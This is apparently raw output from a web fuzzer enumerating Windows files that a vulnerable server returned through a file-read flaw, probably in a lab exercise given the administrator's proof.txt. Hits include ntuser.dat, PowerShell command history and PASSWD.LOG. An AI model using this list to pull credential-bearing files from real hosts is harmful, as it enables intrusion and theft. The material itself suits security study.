000006178:   200        4 L      90 W       12975 Ch    "Users/All Users/Microsoft/IdentityCRL/INT/wlidsvcconfig.xml"                                          
000006185:   200        238 L    2062 W     65526 Ch    "Users/All Users/Microsoft/SmsRouter/MessageStore/edbtmp.log"                                          
000006183:   200        13 L     71 W       65536 Ch    "Users/All Users/Microsoft/SmsRouter/MessageStore/edb.log"                                             
000006175:   200        24 L     141 W      1512 Ch     "Users/All Users/Microsoft/Device Stage/Task/{e35be42d-f742-4d96-a50a-1775fb1a7a42}/en-US/resource.xml"
000006174:   200        225 L    351 W      11005 Ch    "Users/All Users/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/tasks.xml"         
000006173:   200        17 L     101 W      1334 Ch     "Users/All Users/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/resource.xml"      
000006172:   200        17 L     101 W      1334 Ch     "Users/All Users/Microsoft/Device Stage/Task/{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}/en-US/resource.xml"
000006176:   200        192 L    392 W      11364 Ch    "Users/All Users/Microsoft/Device Stage/Task/{e35be42d-f742-4d96-a50a-1775fb1a7a42}/tasks.xml"         
000006171:   200        29 L     96 W       2913 Ch     "Users/All Users/Microsoft/Device Stage/Device/{113527a4-45d4-4b6f-b567-97838f1b04b0}/behavior.xml"    
000006170:   200        22 L     64 W       1741 Ch     "Users/All Users/Microsoft/Device Stage/Device/{8702d817-5aad-4674-9ef3-4d3decd87120}/behavior.xml"    
000006169:   200        2 L      2 W        25 Ch       "Users/All Users/Microsoft OneDrive/setup/refcount.ini"                                                
000006168:   200        2 L      10 W       20 Ch       "users/administrator/ntuser.ini"                                                                       
000006166:   200        1 L      1 W        34 Ch       "users/administrator/desktop/proof.txt"                                                                
000006165:   200        4 L      9 W        282 Ch      "users/administrator/desktop/desktop.ini"                                                              
000006164:   200        9 L      58 W       982 Ch      "users/administrator/appdata/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt"  
000006071:   200        0 L      1 W        1310720 C   "ProgramData/Microsoft/Network/Downloader/edbtmp.log"                                                  
                                            h                                                                                                                  
000006177:   200        1416 L   8468 W     533394 Ch   "Users/All Users/Microsoft/EdgeUpdate/Log/MicrosoftEdgeUpdate.log"                                     
000006192:   200        74 L     129 W      2863 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftLync2013Win64.xml"                              
000006190:   200        109 L    169 W      3966 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftLync2010.xml"                                   
000006070:   200        221 L    1859 W     1310602 C   "ProgramData/Microsoft/Network/Downloader/edb00001.log"                                                
                                            h                                                                                                                  
000006196:   200        400 L    604 W      13158 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013BackupWin32.xml"                      
000006210:   200        74 L     131 W      2889 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftSkypeForBusiness2016Win32.xml"                  
000006209:   200        32 L     89 W       1289 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2016CAWin64.xml"                         
000006208:   200        32 L     89 W       1289 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2016CAWin32.xml"                         
000006207:   200        32 L     89 W       1286 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2013CAWin64.xml"                         
000006204:   200        1788 L   2504 W     65729 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016Win32.xml"                            
000006206:   200        32 L     89 W       1286 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2013CAWin32.xml"                         
000006203:   200        400 L    604 W      13158 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016BackupWin64.xml"                      
000006202:   200        400 L    604 W      13158 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016BackupWin32.xml"                      
000006201:   200        1864 L   2602 W     68365 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Win64.xml"                            
000006200:   200        1864 L   2602 W     68365 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Win32.xml"                            
000006199:   200        337 L    568 W      10594 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Office365Win64.xml"                   
000006198:   200        337 L    568 W      10594 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Office365Win32.xml"                   
000006205:   200        1788 L   2504 W     65732 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016Win64.xml"                            
000006195:   200        1996 L   2711 W     72783 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2010Win64.xml"                            
000006182:   200        0 L      1 W        1310720 C   "Users/All Users/Microsoft/Network/Downloader/edbtmp.log"                                              
                                            h                                                                                                                  
000006181:   200        221 L    1859 W     1310602 C   "Users/All Users/Microsoft/Network/Downloader/edb00001.log"                                            
                                            h                                                                                                                  
000006197:   200        400 L    604 W      13158 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013BackupWin64.xml"                      
000006191:   200        74 L     129 W      2863 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftLync2013Win32.xml"                              
000006193:   200        26 L     70 W       955 Ch      "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftNotepad.xml"                                    
000006213:   200        46 L     131 W      2038 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/NetworkPrinters.xml"                                     
000006211:   200        74 L     131 W      2889 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftSkypeForBusiness2016Win64.xml"                  
000006194:   200        1996 L   2711 W     72783 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2010Win32.xml"                            
000006260:   200        44 L     52 W       2003 Ch     "Windows/diagnostics/index/AudioRecordingDiagnostic.xml"                                               
000006258:   200        24 L     30 W       1233 Ch     "Windows/diagnostics/index/AppsDiagnostic.xml"                                                         
000006256:   200        0 L      0 W        0 Ch        "Windows/debug/PASSWD.LOG"                                                                             
000006255:   200        12 L     82 W       910 Ch      "windows/debug/netsetup.log"                                                                           
000006259:   200        44 L     54 W       2155 Ch     "Windows/diagnostics/index/AudioPlaybackDiagnostic.xml"                                                
000006254:   200        36 L     159 W      2120 Ch     "Windows/debug/mrt.log"                                                                                
000006253:   200        0 L      1 W        4 Ch        "windows/csc/v2.0.6/sm"                                                                                
000006252:   200        0 L      1 W        64 Ch       "windows/csc/v2.0.6/pq"                                                                                
000006248:   200        1 L      1 W        33 Ch       "Windows/assembly/NativeImages_v2.0.50727_64/System.Xml"                                               
000006247:   200        1 L      1 W        33 Ch       "Windows/assembly/NativeImages_v2.0.50727_32/System.Xml"                                               
000006251:   200        5 L      8 W        91 Ch       "Windows/Boot/BootDebuggerFiles.ini"                                                                   
000006250:   200        1 L      1 W        33 Ch       "Windows/assembly/NativeImages_v4.0.30319_64/System.Xml"                                               
000006249:   200        1 L      1 W        33 Ch       "Windows/assembly/NativeImages_v4.0.30319_32/System.Xml"                                               
000006245:   200        1 L      1 W        26 Ch       "Windows/assembly/GAC_MSIL/System.Xml"                                                                 
000006244:   200        1 L      1 W        26 Ch       "Windows/assembly/GAC_MSIL/System.IO.Log"                                                              
000006220:   200        5 L      11 W       120 Ch      "Users/All Users/Microsoft/Windows Defender/Scans/History/Service/Unknown.Log"                         
000006216:   200        26 L     33 W       890 Ch      "Users/All Users/Microsoft/UEV/InboxTemplates/VdiState.xml"                                            
000006215:   200        60 L     152 W      2521 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/ThemeSettings2013.xml"                                   
000006167:   200        3483 L   25908 W    1304916 C   "users/administrator/ntuser.dat"                                                                       
                                            h                                                                                                                  
000006212:   200        26 L     71 W       1003 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftWordpad.xml"                                    
000006214:   200        71 L     199 W      3253 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/RoamingCredentialSettings.xml"                           
000006261:   200        23 L     27 W       1121 Ch     "Windows/diagnostics/index/BITSDiagnostic.xml"                                                         
000006263:   200        58 L     77 W       2225 Ch     "Windows/diagnostics/index/DeviceCenterDiagnostic.xml"                                                 
000006267:   200        22 L     28 W       1216 Ch     "Windows/diagnostics/index/KeyboardDiagnostic.xml"                                                     
000006275:   200        28 L     33 W       1591 Ch     "Windows/diagnostics/index/PowerDiagnostic.xml"                                                        
000006281:   200        22 L     27 W       1310 Ch     "Windows/diagnostics/index/WindowsMediaPlayerMediaLibrary.xml"                                         
000006280:   200        23 L     28 W       1429 Ch     "Windows/diagnostics/index/WindowsMediaPlayerConfiguration.xml"                                        
000006279:   200        21 L     27 W       1198 Ch     "Windows/diagnostics/index/VideoPlaybackDiagnostic.xml"                                                
000006278:   200        71 L     82 W       2812 Ch     "Windows/diagnostics/index/SpeechDiagnostic.xml"                                                       
000006277:   200        29 L     34 W       1677 Ch     "Windows/diagnostics/index/SearchDiagnostic.xml"                                                       
000006274:   200        26 L     32 W       1484 Ch     "Windows/diagnostics/index/PCWDiagnostic.xml"                                                          
000006276:   200        61 L     76 W       2724 Ch     "Windows/diagnostics/index/PrinterDiagnostic.xml"                                                      
000006273:   200        32 L     39 W       1829 Ch     "Windows/diagnostics/index/NetworkDiagnostics_6_DA.xml"                                                
000006272:   200        36 L     43 W       2177 Ch     "Windows/diagnostics/index/NetworkDiagnostics_5_Inbound.xml"                                           
000006269:   200        34 L     42 W       2053 Ch     "Windows/diagnostics/index/NetworkDiagnostics_1_Web.xml"                                               
000006271:   200        32 L     39 W       1815 Ch     "Windows/diagnostics/index/NetworkDiagnostics_4_NetworkAdapter.xml"                                    
000006266:   200        35 L     40 W       2234 Ch     "Windows/diagnostics/index/IESecurityDiagnostic.xml"                                                   
000006270:   200        35 L     42 W       2088 Ch     "Windows/diagnostics/index/NetworkDiagnostics_2_FileShare.xml"                                         
000006268:   200        23 L     28 W       1278 Ch     "Windows/diagnostics/index/MaintenanceDiagnostic.xml"                                                  
000006265:   200        31 L     36 W       1937 Ch     "Windows/diagnostics/index/IEBrowseWebDiagnostic.xml"                                                  
000006262:   200        31 L     38 W       2039 Ch     "Windows/diagnostics/index/BluetoothDiagnostic.xml"                                                    
000006264:   200        24 L     31 W       1076 Ch     "Windows/diagnostics/index/DeviceDiagnostic.xml"                                                       
000006282:   200        34 L     43 W       1873 Ch     "Windows/diagnostics/index/WindowsMediaPlayerPlayDVD.xml"                                              
000006296:   200        1 L      12 W       319 Ch      "Windows/ImmersiveControlPanel/appxblockmap.xml"                                                       
000006302:   200        2 L      2 W        42 Ch       "Windows/INF/.NET CLR Networking 4.0.0.0/0000/_Networkingperfcounters_d.ini"                           
000006300:   200        2 L      2 W        36 Ch       "Windows/INF/.NET CLR Data/0000/_DataPerfCounters_d.ini"                                               
000006299:   200        627 L    3304 W     54198 Ch    "Windows/INF/.NET CLR Data/_DataPerfCounters.ini"                                                      
000006297:   200        58 L     83 W       2443 Ch     "Windows/ImmersiveControlPanel/appxmanifest.xml"                                                       
000006291:   200        4 L      90 W       12695 Ch    "Windows/IdentityCRL/production/wlidsvcconfig.xml"                                                     
000006290:   200        4 L      90 W       12975 Ch    "Windows/IdentityCRL/INT/wlidsvcconfig.xml"                                                            
000006287:   200        2 L      2 W        65 Ch       "Windows/Fonts/desktop.ini"                                                                            
000006288:   200        618 L    6299 W     95687 Ch    "Windows/Globalization/Time Zone/timezoneMapping.xml"                                                  
000006283:   200        38 L     50 W       1914 Ch     "Windows/diagnostics/index/WindowsUpdateDiagnostic.xml"                                                
000006285:   200        5 L      60 W       776 Ch      "Windows/DtcInstall.log"                                                                               
000006303:   200        522 L    3242 W     52778 Ch    "Windows/INF/.NET CLR Networking/_Networkingperfcounters_v2.ini"                                       
000006309:   200        2 L      2 W        33 Ch       "Windows/INF/.NET Memory Cache 4.0/0000/netmemorycache_d.ini"                                          
000006333:   200        49 L     291 W      4344 Ch     "Windows/INF/rdyboost/0409/ReadyBoostPerfCounters.ini"                                                 
000006305:   200        1183 L   4595 W     98640 Ch    "Windows/INF/.NET Data Provider for Oracle/_DataOracleClientPerfCounters_shared12_neutral.ini"         
000006343:   200        2 L      2 W        51 Ch       "Windows/INF/ServiceModelService 3.0.0.0/0000/_ServiceModelServicePerfCounters_D.ini"                  
000006301:   200        1154 L   9596 W     166284 Ch   "Windows/INF/.NET CLR Networking 4.0.0.0/_Networkingperfcounters.ini"                                  
000006341:   200        2 L      2 W        53 Ch       "Windows/INF/ServiceModelOperation 3.0.0.0/0409/_ServiceModelOperationPerfCounters_D.ini"              
000006340:   200        2 L      2 W        53 Ch       "Windows/INF/ServiceModelOperation 3.0.0.0/0000/_ServiceModelOperationPerfCounters_D.ini"              
000006338:   200        2 L      2 W        52 Ch       "Windows/INF/ServiceModelEndpoint 3.0.0.0/0409/_ServiceModelEndpointPerfCounters_D.ini"                
000006337:   200        2 L      2 W        52 Ch       "Windows/INF/ServiceModelEndpoint 3.0.0.0/0000/_ServiceModelEndpointPerfCounters_D.ini"                
000006335:   200        86 L     567 W      6918 Ch     "Windows/INF/RemoteAccess/0409/rasctrs.ini"                                                            
000006332:   200        49 L     291 W      4284 Ch     "Windows/INF/rdyboost/0000/ReadyBoostPerfCounters.ini"                                                 
000006289:   200        5310 L   33092 W    428828 Ch   "Windows/Globalization/Time Zone/timezones.xml"                                                        
000006334:   200        86 L     567 W      6918 Ch     "Windows/INF/RemoteAccess/0000/rasctrs.ini"                                                            
000006331:   200        39 L     174 W      3864 Ch     "Windows/INF/MSDTC/0409/msdtcprf.ini"                                                                  
000006330:   200        39 L     174 W      3864 Ch     "Windows/INF/MSDTC/0000/msdtcprf.ini"                                                                  
000006329:   200        1 L      2 W        47 Ch       "Windows/INF/MSDTC Bridge 4.0.0.0/0000/_TransactionBridgePerfCounters_d.ini"                           
000006327:   200        2 L      2 W        49 Ch       "Windows/INF/MSDTC Bridge 3.0.0.0/0409/_TransactionBridgePerfCounters_D.ini"                           
000006339:   200        1243 L   6944 W     244769 Ch   "Windows/INF/ServiceModelOperation 3.0.0.0/_ServiceModelOperationPerfCounters.ini"                     
000006326:   200        2 L      2 W        49 Ch       "Windows/INF/MSDTC Bridge 3.0.0.0/0000/_TransactionBridgePerfCounters_D.ini"                           
000006336:   200        1543 L   9144 W     315133 Ch   "Windows/INF/ServiceModelEndpoint 3.0.0.0/_ServiceModelEndpointPerfCounters.ini"                       
000006324:   200        28 L     132 W      2078 Ch     "Windows/INF/LSM/0409/lagcounterdef.ini"                                                               
000006323:   200        28 L     132 W      1878 Ch     "Windows/INF/LSM/0000/lagcounterdef.ini"                                                               
000006325:   200        959 L    5607 W     131650 Ch   "Windows/INF/MSDTC Bridge 3.0.0.0/_TransactionBridgePerfCounters.ini"                                  
000006320:   200        29 L     143 W      2770 Ch     "Windows/INF/BITS/0409/bitsctrs.ini"                                                                   
000006319:   200        28 L     141 W      2766 Ch     "Windows/INF/BITS/0000/bitsctrs.ini"                                                                   
000006328:   200        959 L    5804 W     135726 Ch   "Windows/INF/MSDTC Bridge 4.0.0.0/_TransactionBridgePerfCounters.ini"                                  
000006284:   200        967 L    1722 W     667214 Ch   "Windows/DiagTrack/Scenarios/windows.uif_ondemand.xml"                                                 
000006311:   200        2 L      2 W        36 Ch       "Windows/INF/.NETFramework/0000/corperfmonsymbols_d.ini"                                               
000006308:   200        2 L      2 W        53 Ch       "Windows/INF/.NET Data Provider for SqlServer/0000/_dataperfcounters_shared12_neutral_d.ini"           
000006310:   200        39 L     117 W      1288 Ch     "Windows/INF/.NET Memory Cache 4.0/netmemorycache.ini"                                                 
000006307:   200        1183 L   4591 W     98692 Ch    "Windows/INF/.NET Data Provider for SqlServer/_dataperfcounters_shared12_neutral.ini"                  
000006304:   200        2 L      2 W        45 Ch       "Windows/INF/.NET CLR Networking/0000/_Networkingperfcounters_v2_d.ini"                                
000006306:   200        2 L      2 W        65 Ch       "Windows/INF/.NET Data Provider for Oracle/0000/_DataOracleClientPerfCounters_shared12_neutral_d.ini"  
000006344:   200        2 L      2 W        51 Ch       "Windows/INF/ServiceModelService 3.0.0.0/0409/_ServiceModelServicePerfCounters_D.ini"                  
000006350:   200        2 L      2 W        41 Ch       "Windows/INF/SMSvcHost 3.0.0.0/0000/_SMSvcHostPerfCounters_D.ini"                                      
000006358:   200        262 L    1817 W     30628 Ch    "Windows/INF/UGatherer/0000/gsrvctr.ini"                                                               
000006322:   200        3583 L   53878 W    854534 Ch   "Windows/INF/ESENT/0409/esentprf.ini"                                                                  
000006374:   200        810 L    10483 W    122831 Ch   "Windows/Logs/DISM/dism.log"                                                                           
000006342:   200        2571 L   17487 W    559176 Ch   "Windows/INF/ServiceModelService 3.0.0.0/_ServiceModelServicePerfCounters.ini"                         
000006298:   200        17014    19238 W    909977 Ch   "Windows/ImmersiveControlPanel/Settings/AllSystemSettings_{253E530E-387D-4BC2-959D-E6F86122E5F2}.xml"  
                        L                                                                                                                                      
000006378:   200        171 L    366 W      13658 Ch    "Windows/Logs/MoSetup/DeviceInventory.xml"                                                             
000006377:   200        14 L     41 W       1145 Ch     "Windows/Logs/MoSetup/ActionList.xml"                                                                  
000006376:   200        0 L      0 W        0 Ch        "Windows/Logs/DPX/setuperr.log"                                                                        
000006321:   200        3583 L   53878 W    854534 Ch   "Windows/INF/ESENT/0000/esentprf.ini"                                                                  
000006375:   200        5462 L   61642 W    525418 Ch   "Windows/Logs/DPX/setupact.log"                                                                        
000006372:   200        150 L    981 W      20698 Ch    "Windows/INF/wsearchidxpi/0409/idxcntrs.ini"                                                           
000006369:   200        352 L    2231 W     39002 Ch    "Windows/INF/WmiApRpl/0009/WmiApRpl.ini"                                                               
000006367:   200        2 L      2 W        31 Ch       "Windows/INF/Windows Workflow Foundation 4.0.0.0/0000/PerfCounters_d.ini"                              
000006365:   200        2 L      2 W        31 Ch       "Windows/INF/Windows Workflow Foundation 3.0.0.0/0409/PerfCounters_D.ini"                              
000006370:   200        352 L    2231 W     39002 Ch    "Windows/INF/WmiApRpl/WmiApRpl.ini"                                                                    
000006364:   200        2 L      2 W        31 Ch       "Windows/INF/Windows Workflow Foundation 3.0.0.0/0000/PerfCounters_D.ini"                              
000006363:   200        66 L     361 W      5982 Ch     "Windows/INF/usbhub/0409/usbperf.ini"                                                                  
000006362:   200        66 L     361 W      5982 Ch     "Windows/INF/usbhub/0000/usbperf.ini"                                                                  
000006368:   200        1668 L   6969 W     154185 Ch   "Windows/INF/Windows Workflow Foundation 4.0.0.0/PerfCounters.ini"                                     
000006366:   200        1740 L   6641 W     153207 Ch   "Windows/INF/Windows Workflow Foundation 3.0.0.0/PerfCounters.ini"                                     
000006361:   200        229 L    1995 W     31698 Ch    "Windows/INF/UGTHRSVC/0409/gthrctr.ini"                                                                
000006360:   200        229 L    1995 W     31698 Ch    "Windows/INF/UGTHRSVC/0000/gthrctr.ini"                                                                
000006359:   200        262 L    1817 W     30628 Ch    "Windows/INF/UGatherer/0409/gsrvctr.ini"                                                               
000006356:   200        31 L     99 W       1060 Ch     "Windows/INF/TermService/0000/tslabels.ini"                                                            
000006355:   200        38 L     176 W      2724 Ch     "Windows/INF/TAPISRV/0409/tapiperf.ini"                                                                
000006354:   200        38 L     176 W      2724 Ch     "Windows/INF/TAPISRV/0000/tapiperf.ini"                                                                
000006353:   200        1 L      2 W        39 Ch       "Windows/INF/SMSvcHost 4.0.0.0/0000/_SMSvcHostPerfCounters_d.ini"                                      
000006351:   200        2 L      2 W        41 Ch       "Windows/INF/SMSvcHost 3.0.0.0/0409/_SMSvcHostPerfCounters_D.ini"                                      
000006357:   200        31 L     99 W       1060 Ch     "Windows/INF/TermService/0409/tslabels.ini"                                                            
000006371:   200        150 L    981 W      20698 Ch    "Windows/INF/wsearchidxpi/0000/idxcntrs.ini"                                                           
000006348:   200        1242 L   7279 W     99264 Ch    "Windows/INF/setupapi.setup.log"                                                                       
000006352:   200        1171 L   6096 W     133817 Ch   "Windows/INF/SMSvcHost 4.0.0.0/_SMSvcHostPerfCounters.ini"                                             
000006349:   200        1171 L   5976 W     132215 Ch   "Windows/INF/SMSvcHost 3.0.0.0/_SMSvcHostPerfCounters.ini"                                             
000006312:   200        6486 L   99702 W    1514778 C   "Windows/INF/.NETFramework/corperfmonsymbols.ini"                                                      
                                            h                                                                                                                  
000006408:   200        542 L    6465 W     209508 Ch   "windows/notepad.exe"                                                                                  
000006431:   200        860 L    1644 W     26599 Ch    "Windows/Panther/UnattendGC/diagerr.xml"                                                               
000006432:   200        860 L    1644 W     26599 Ch    "Windows/Panther/UnattendGC/diagwrn.xml"                                                               
000006433:   200        34 L     286 W      3576 Ch     "Windows/Panther/UnattendGC/setupact.log"                                                              
000006434:   200        0 L      0 W        0 Ch        "Windows/Panther/UnattendGC/setuperr.log"                                                              
000006435:   200        75 L     784 W      6246 Ch     "Windows/Performance/WinSAT/winsat.log"                                                                
000006436:   200        62 L     528 W      17070 Ch    "Windows/PFRO.log"                                                                                     
000006439:   200        1 L      12 W       319 Ch      "Windows/PrintDialog/appxblockmap.xml"                                                                 
000006440:   200        68 L     106 W      2810 Ch     "Windows/PrintDialog/appxmanifest.xml"                                                                 
000006441:   200        302 L    419 W      7062 Ch     "Windows/Provisioning/categories.xml"                                                                  
000006442:   200        1012 L   2606 W     28861 Ch    "Windows/Provisioning/CountryTable.xml"                                                                
000006443:   200        868 L    1516 W     29569 Ch    "Windows/Provisioning/IccidToRegion.xml"                                                               
000006449:   200        61 L     111 W      1954 Ch     "Windows/schemas/CodeIntegrity/ExamplePolicies/AllowAll.xml"                                           
000006448:   200        64 L     117 W      2052 Ch     "Windows/schemas/CodeIntegrity/ExamplePolicies/AllowAll_EnableHVCI.xml"                                
000006450:   200        171 L    431 W      7040 Ch     "Windows/schemas/CodeIntegrity/ExamplePolicies/AllowMicrosoft.xml"                                     
000006451:   200        265 L    796 W      11010 Ch    "Windows/schemas/CodeIntegrity/ExamplePolicies/DefaultWindows_Audit.xml"                               
000006452:   200        262 L    794 W      10949 Ch    "Windows/schemas/CodeIntegrity/ExamplePolicies/DefaultWindows_Enforced.xml"                            
000006453:   200        53 L     97 W       1678 Ch     "Windows/schemas/CodeIntegrity/ExamplePolicies/DenyAllAudit.xml"                                       
000006458:   200        651 L    1149 W     63947 Ch    "Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml"        
000006438:   200        3473 L   7517 W     378100 Ch   "Windows/prefetch/Layout.ini"                                                                          
000006470:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/ProfessionalEducationEdition.xml"                                          
000006475:   200        16 L     93 W       1110 Ch     "Windows/servicing/Editions/WimBootConfig.ini"                                                         
000006474:   200        646 L    3880 W     80077 Ch    "Windows/servicing/Editions/UpgradeMatrix.xml"                                                         
000006476:   200        366 L    2154 W     89629 Ch    "Windows/servicing/InboxFodMetadataCache/ActionList.xml"                                               
000006473:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/ServerRdshEdition.xml"                                                     
000006472:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/ProfessionalWorkstationEdition.xml"                                        
000006469:   200        334 L    462 W      30831 Ch    "Windows/servicing/Editions/ProfessionalEdition.xml"                                                   
000006471:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/ProfessionalSingleLanguageEdition.xml"                                     
000006468:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/ProfessionalCountrySpecificEdition.xml"                                    
000006466:   200        334 L    462 W      30831 Ch    "Windows/servicing/Editions/EnterpriseEdition.xml"                                                     
000006465:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/EducationEdition.xml"                                                      
000006464:   200        42 L     159 W      3782 Ch     "Windows/servicing/Editions/EditionMatrix.xml"                                                         
000006461:   200        418 L    2452 W     47478 Ch    "Windows/ServiceProfiles/NetworkService/AppData/Local/Temp/MpCmdRun.log"                               
000006463:   200        107 L    124 W      2676 Ch     "Windows/servicing/Editions/EditionMappings.xml"                                                       
000006460:   200        651 L    1149 W     63947 Ch    "Windows/ServiceProfiles/NetworkService/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml"      
000006457:   200        3 L      7 W        80 Ch       "Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Windows Sidebar/settings.ini"            
000006459:   200        3 L      7 W        80 Ch       "Windows/ServiceProfiles/NetworkService/AppData/Local/Microsoft/Windows Sidebar/settings.ini"          
000006477:   200        2 L      2 W        42 Ch       "Windows/Setup/State/State.ini"                                                                        
000006491:   200        57 L     61 W       912 Ch      "Windows/Speech_OneCore/Engines/TTS/en-US/M1033David.INI"                                              
000006467:   200        333 L    459 W      30791 Ch    "Windows/servicing/Editions/IoTEnterpriseEdition.xml"                                                  
000006499:   200        13 L     15 W       219 Ch      "windows/system.ini"                                                                                   
000006498:   200        33 L     33 W       494 Ch      "Windows/Speech/Engines/TTS/en-US/M1033ZIR.INI"                                                        
000006483:   200        945 L    20149 W    525096 Ch   "Windows/SoftwareDistribution/ReportingEvents.log"                                                     
000006497:   200        27 L     85 W       857 Ch      "Windows/Speech/Engines/SR/en-US/l1033.ini"                                                            
000006454:   200        8 L      21 W       1048576 C   "Windows/security/database/edb.log"                                                                    
                                            h                                                                                                                  
000006345:   200        31599    197411 W   2688731 C   "Windows/INF/setupapi.dev.log"                                                                         
                        L                   h                                                                                                                  
000006495:   200        32 L     65 W       1386 Ch     "Windows/Speech_OneCore/Engines/TTS/en-US/MSTTSLocEnUS.INI"                                            
000006494:   200        80 L     71 W       1359 Ch     "Windows/Speech_OneCore/Engines/TTS/en-US/M1033Zira.INI"                                               
000006500:   200        6249 L   5172 W     177756 Ch   "Windows/System32/appraiser/Appraiser_Data.ini"                                                        
000006493:   200        77 L     69 W       1234 Ch     "Windows/Speech_OneCore/Engines/TTS/en-US/M1033Mark.INI"                                               
000006492:   200        90 L     78 W       1645 Ch     "Windows/Speech_OneCore/Engines/TTS/en-US/M1033Eva.INI"                                                
000006485:   200        25 L     66 W       626 Ch      "Windows/Speech_OneCore/Engines/SR/en-US-N/l1033.ini"                                                  
000006521:   200        16 L     58 W       2478 Ch     "Windows/System32/config/systemprofile/AppData/Local/Microsoft/CLR_v4.0/UsageLogs/powershell.exe.log"  
000006520:   200        5 L      14 W       642 Ch      "Windows/System32/config/systemprofile/AppData/Local/Microsoft/CLR_v4.0/UsageLogs/NGenTask.exe.log"    
000006523:   200        3 L      6 W        226 Ch      "Windows/System32/config/systemprofile/AppData/Local/Microsoft/CLR_v4.0/UsageLogs/taskhostw.exe.log"   
000006537:   200        17 L     14 W       425 Ch      "Windows/System32/spool/tools/Microsoft Print To PDF/MPDW-manifest.ini"                                
000006455:   200        0 L      1 W        1048576 C   "Windows/security/database/edbtmp.log"                                                                 
                                            h                                                                                                                  
000006536:   200        320 L    2540 W     47020 Ch    "Windows/System32/slmgr/0409/slmgr.ini"                                                                
000006538:   200        15 L     12 W       353 Ch      "Windows/System32/spool/tools/Microsoft XPS Document Writer/mxdw-manifest.ini"                         
000006533:   200        51 L     648 W      8960 Ch     "Windows/System32/LogFiles/setupcln/setuperr.log"                                                      
000006539:   200        252 L    1843 W     65157 Ch    "Windows/System32/sru/SRU.log"                                                                         
000006532:   200        893 L    8690 W     125480 Ch   "Windows/System32/LogFiles/setupcln/setupact.log"                                                      
000006524:   200        21 L     134 W      824 Ch      "windows/system32/drivers/etc/hosts"                                                                   
000006543:   200        211 L    1475 W     65014 Ch    "Windows/System32/sru/SRUtmp.log"                                                                      
000006530:   200        668 L    11132 W    138303 Ch   "windows/system32/license.rtf"                                                                         
000006555:   200        1951 L   6070 W     60124 Ch    "Windows/System32/tcpmon.ini"                                                                          
000006535:   200        4431 L   67285 W    840962 Ch   "Windows/System32/PerfStringBackup.INI"                                                                
000006286:   200        15512    136357 W   4783107 C   "windows/explorer.exe"                                                                                 
                        L                   h                                                                                                                  
000006347:   200        22366    134558 W   2091344 C   "Windows/INF/setupapi.offline.log"                                                                     
                        L                   h                                                                                                                  
000006563:   200        2 L      2 W        26 Ch       "Windows/SystemResources/Windows.UI.Logon"                                                             
000006571:   200        14 L     93 W       959 Ch      "Windows/Temp/ASPNETSetup_00001.log"                                                                   
000006583:   200        879 L    5195 W     80878 Ch    "Windows/Temp/MpCmdRun.log"                                                                            
000006570:   200        14 L     93 W       957 Ch      "Windows/Temp/ASPNETSetup_00000.log"                                                                   
000006569:   200        23 L     23 W       543 Ch      "windows/temp/"                                                                                        
000006567:   200        79 L     107 W      2404 Ch     "Windows/SysWOW64/WimBootCompress.ini"                                                                 
000006584:   200        1036 L   18320 W    179012 Ch   "Windows/Temp/MpSigStub.log"                                                                           
000006566:   200        320 L    2540 W     47020 Ch    "Windows/SysWOW64/slmgr/0409/slmgr.ini"                                                                
000006565:   200        16 L     58 W       1962 Ch     "Windows/SysWOW64/config/systemprofile/AppData/Local/Microsoft/CLR_v4.0_32/UsageLogs/powershell.exe.log
                                                        "                                                                                                      
000006562:   200        696 L    5175 W     102518 Ch   "Windows/System32/winrm/0409/winrm.ini"                                                                
000006564:   200        5 L      14 W       642 Ch      "Windows/SysWOW64/config/systemprofile/AppData/Local/Microsoft/CLR_v4.0_32/UsageLogs/NGenTask.exe.log" 
000006561:   200        79 L     107 W      2404 Ch     "Windows/System32/WimBootCompress.ini"                                                                 
000006560:   200        352 L    2231 W     39002 Ch    "Windows/System32/wbem/Performance/WmiApRpl.ini"                                                       
